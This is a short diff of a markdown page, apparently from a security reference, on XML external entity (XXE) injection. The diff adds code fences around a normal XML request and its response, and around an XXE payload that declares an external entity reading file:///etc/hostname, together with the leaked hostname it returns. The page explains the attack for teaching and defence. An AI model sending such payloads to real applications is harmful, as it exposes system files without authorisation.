@@ -8,19 +8,27 @@ An adversary may interfere with an application's processing of extensible markup
 
 ## Code
 #### Target-in
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <getLastName>John01</getLastName>
+```
 
 #### Target-Out
+```
 Jone Doe
+```
 
 #### Target-in
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE malicious [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
 <getInfo>&xxe;</getInfo>
+```
 
 #### Target-Out
+```
 usystem01
+```
 
 ## Impact
 High
